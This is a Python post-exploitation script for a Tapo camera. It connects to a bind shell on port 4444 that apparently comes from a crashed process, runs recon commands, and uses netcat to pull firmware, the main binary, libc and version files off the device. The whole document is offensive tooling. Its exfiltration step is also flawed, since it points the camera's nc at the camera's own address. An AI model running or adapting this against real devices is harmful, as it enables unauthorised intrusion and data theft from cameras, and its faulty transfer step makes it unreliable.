#!/usr/bin/env python3
"""Post-exploitation over the Tapo bind shell on :4444.

The shell dies with the crashed process, so the order is: recon, then pull the
artifacts that cannot be recovered any other way (`/proc/mtd`, `/bin/main`,
`/etc/*version*`, libc) before anything else. Files land in
`/tmp/pane1/<host>/` and are size-checked.

Usage:
  tapo_post.py <host> [--pull] [--port 5555]
"""
import argparse
import os
import socket
import subprocess
import sys
import time

RECON = (
    "id",
    "uname -a",
    "cat /proc/cmdline",
    "cat /proc/mtd",
    "mount",
    "df -h / /tmp",
    "ls -l /bin/main /usr/bin/dsd /etc/*version* 2>&1",
    "cat /etc/os-release 2>/dev/null; cat /version 2>/dev/null; cat /etc/*version* 2>&1 | head",
    "cat /proc/sys/kernel/randomize_va_space",
)

PULLS = ("/proc/mtd", "/bin/main", "/lib/libc.so.0")


def cmd(host: str, line: str, wait: float = 2.0) -> str:
    s = socket.create_connection((host, 4444), timeout=5)
    s.settimeout(wait)
    s.sendall((line + "\n").encode())
    time.sleep(0.4)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out.decode("latin1", "replace")


def pull(host: str, remote: str, local: str, port: int, timeout: float = 180.0) -> bool:
    """Receive one file: listener here, `nc host port < remote` on the camera."""
    with open(local, "wb") as fh:
        srv = subprocess.Popen(["nc", "-l", str(port)], stdout=fh)
    time.sleep(0.6)
    cmd(host, "nc %s %d < %s" % (host, port, remote), wait=1.0)
    t0 = time.time()
    while srv.poll() is None and time.time() - t0 < timeout:
        time.sleep(0.5)
    if srv.poll() is None:
        srv.terminate()
    return os.path.getsize(local) > 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--pull", action="store_true")
    ap.add_argument("--port", type=int, default=5555)
    a = ap.parse_args()

    outdir = os.path.join("/tmp/pane1", a.host)
    os.makedirs(outdir, exist_ok=True)

    log = []
    for line in RECON:
        res = cmd(a.host, line)
        print("$", line)
        print(res.strip()[:2000])
        print()
        log.append("$ %s\n%s\n" % (line, res))
    open(os.path.join(outdir, "recon.txt"), "w").write("\n".join(log))

    if not a.pull:
        return 0

    targets = list(PULLS)
    versions = cmd(a.host, "ls /etc/*version* 2>/dev/null").split()
    targets += versions
    for i, remote in enumerate(targets):
        local = os.path.join(outdir, remote.strip("/").replace("/", "_"))
        ok = pull(a.host, remote, local, a.port + i)
        print("%-28s -> %s (%s)" % (remote, local, "ok" if ok else "EMPTY"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
